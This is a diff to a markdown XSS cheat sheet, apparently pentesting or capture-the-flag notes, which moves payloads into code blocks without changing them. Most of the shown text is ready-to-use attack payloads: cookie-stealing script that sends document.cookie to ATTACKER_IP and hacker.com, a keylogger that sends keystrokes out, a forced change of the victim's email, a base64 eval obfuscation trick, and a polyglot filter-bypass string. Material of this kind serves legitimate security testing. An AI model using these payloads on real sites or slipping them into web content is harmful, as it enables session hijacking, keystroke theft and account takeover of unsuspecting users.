@@ -1,8 +1,16 @@
-# PoC Payload: <script>alert('XSS');</script>
+# Cross-Site Scripting (XSS)
 
-### PoC Payload 2: <img src=x onerror="document.location='http://ATTACKER_IP:PORT/'"/<
+## PoC Payload: 
 
-### Steal cookie XSS Payload: <img src=x onerror='eval(atob("fetch('http://ATTACKER_IP:PORT/?cookie='+document.cookie)"));' /< (ENCODE THE ATOB PAYLOAD IN BASE64)
+    <script>alert('XSS');</script>
+
+### PoC Payload 2: 
+
+    <img src=x onerror="document.location='http://ATTACKER_IP:PORT/'"/<
+
+### Steal cookie XSS Payload: 
+
+    <img src=x onerror='eval(atob("fetch('http://ATTACKER_IP:PORT/?cookie='+document.cookie)"));' /< (ENCODE THE ATOB PAYLOAD IN BASE64)
 
 ## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
 
@@ -20,15 +28,23 @@
 
 ### 2) Make sure everything is escaped so that you can bypass basic defense mechanisms
 
-### Example: <>/\script'"=
+### Example: 
+
+    <>/\script'"=
 
 ### 3) Use alternative to "alert" payload to test for XSS
 
-### Session stealing: <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
+### Session stealing: 
 
-### Keylogger: <script>document.onkeypress = function(p){ fetch ('https://hacker.com/log?key=' + btoa(p.key) );}</script>
+    <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
 
-### Change user's email address: <script>user.changeEmail('attacker@hacker.com');</script>
+### Keylogger: 
+
+    <script>document.onkeypress = function(p){ fetch ('https://hacker.com/log?key=' + btoa(p.key) );}</script>
+
+### Change user's email address: 
+
+    <script>user.changeEmail('attacker@hacker.com');</script>
 
 # Stored XSS
 
@@ -80,7 +96,7 @@
 
 # POLYGLOT PAYLOAD
 
-#### jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e (XSS filter bypass)
+    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e (XSS filter bypass)
 
 
 ## Commands
